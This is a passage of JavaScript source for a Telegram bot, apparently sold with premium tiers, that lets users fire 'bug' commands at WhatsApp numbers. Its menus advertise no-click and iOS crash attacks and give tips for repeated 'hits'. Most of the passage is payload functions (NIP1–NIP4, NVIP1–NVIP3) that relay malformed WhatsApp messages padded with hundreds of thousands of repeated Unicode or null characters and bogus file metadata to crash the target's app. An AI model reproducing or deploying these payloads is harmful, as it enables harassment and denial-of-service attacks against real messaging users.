        // Hapus pesan sebelumnya
        await ctx.deleteMessage();

        // Kirim pesan baru dengan gambar
        await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
            caption: guideMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "🔙 Back to Bug Menu",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    } catch (error) {
        // Fallback jika ada error
        await ctx.reply(guideMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "🔙 Back to Bug Menu",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    }
});

bot.action('ios_guide', async (ctx) => {
    const guideMessage = `
╭═══════『 𝐢𝐎𝐒 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐁𝐞𝐬𝐭 𝐏𝐫𝐚𝐜𝐭𝐢𝐜𝐞𝐬 』
│ • Use iosv1 for older versions
│ • cursoriosv1 works on all iOS
│ • Match bug with iOS version
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐓𝐢𝐩𝐬 』
│ • Best on latest WhatsApp iOS
│ • Try different bugs if one fails
│ • Keep 1-min gap between hits
│
╰═════════════════════⊱`;

    try {
        // Hapus pesan sebelumnya
        await ctx.deleteMessage();

        // Kirim pesan baru dengan gambar
        await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
            caption: guideMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "🔙 Back to Bug Menu",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    } catch (error) {
        // Fallback jika ada error
        await ctx.reply(guideMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "🔙 Back to Bug Menu",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    }
});

bot.action('ownermenu', async (ctx) => {
    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
  ╭═══════『 𝐍𝐔𝐒𝐀𝐍𝐓𝐀𝐑𝐀 𝐎𝐖𝐍𝐄𝐑 』═══════⊱
  │
  ├─────『 𝐎𝐖𝐍𝐄𝐑 𝐂𝐌𝐃 』
  │ • /addadmin ⚡
  │   └ Add New Admin Access
  │
  │ • /deladmin 🗑️
  │   └ Remove Admin Access
  │
  │ • /cekusersc 📊
  │   └ Check Active Users
  │
  │ • /monitoruser 📱
  │   └ Monitor All Activities
  │
  │ • /addpairing 🔗
  │   └ Connect WhatsApp
  │
  │ • /removebotallbot ⚠️
  │   └ Remove Bot Session
  │
  ├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
  │ • Mode: Active ✅
  │ •  Stable Release
  │ • Owner: 
  │
  ╰═════════════════════⊱
  
  *© 2024 AxèrtáBot🚀*`;

    const mainKeyboard = [
        [{
            text: "⚡ REFRESH PANEL",
            callback_data: "ownermenu"
        }],
        [{
            text: "🏠 BACK TO MENU",
            callback_data: "main_menu"
        }]
    ];

    try {
        await ctx.deleteMessage();
        await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    } catch (error) {
        await ctx.reply(mainMenuMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
    try {
        await ctx.deleteMessage();
    } catch (error) {
        console.error("Error deleting message:", error);
    }

    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
╭═══════『 AxèrtáBot 』═══════⊱
│
├─────『 𝐌𝐚𝐢𝐧 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬 』
│ 📱 *Status:* Active & Running
│ 💎 *Premium:* ${isPremium ? '✅ Active' : '❌ Not Active'}
│ 👑 *Admin:* ${isAdminStatus ? '✅ Yes' : '❌ No'}
│
├─────『 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 』
│ ⚡ /crott » No-Click Crash
│ 🌪️ /dayyum » CNC + Kombinasi
│ 📱 /iosv1 » iOS Specific Bug
│ 🎯 /cursoriosv1 » CNC + iOS Cursor
│
├─────『 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ 🛡️ *Protection:* Active
│ 🔄 *Version:* 3.0 Stable Release
│ ⚙️ *Mode:* Stable
│
╰═════════════════════⊱

*📋 Note:*
- Commands require premium access
- Use responsibly and ethically
- Report any issues to admin

*© 2024 AxèrtáBot🚀 - *
`;

    const mainKeyboard = [
        [{
            text: "⚡ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐌𝐞𝐧𝐮",
            callback_data: "developercmd"
        }],
        [{
                text: "🎯 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                callback_data: "bugmenu"
            },
            {
                text: "👑 𝐀𝐝𝐦𝐢𝐧 𝐌𝐞𝐧𝐮",
                callback_data: "adminmenu"
            }
        ],
        [{
            text: "💎 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐈𝐧𝐟𝐨",
            callback_data: "premiuminfo"
        }]
    ];

    try {
        await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    } catch (error) {
        // Fallback jika gambar tidak tersedia
        await ctx.reply(mainMenuMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }
});

async function NIP1(target) {
      try {
        await zephy.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "Draculaxtzy IOՏ̊‏‎‏‎‏‎‏⭑",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ᐯᗩᗰᑭIᖇᗴ IOՏ̊‏‎",
                  body: "ᐯᗩᗰᑭIᖇᗴ IOՏ‏‎",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
async function NIP2(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "RizzGantengSholatYok" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await zephy.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function NIP3(target) {
zephy.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Bangg??" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function NIP4(target) {
zephy.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "draculaxios ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function NVIP1(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: zephy.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await zephy.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

async function NVIP2(target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(900000);
        let deepNested = {
          title: "\u0000".repeat(900000),
          highlight_label: "\u0000".repeat(900000),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(900000),
              subrows: [
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(900000),
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              stanzaId: zephy.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 19316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
							},
					   },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                ],
              },
            },
          },
        },
      };
      await zephy.relayMessage(target, message, {
        participant: { jid: target },
    });
}

async function NVIP3(target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: zephy.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 39567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                },
                contentText: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
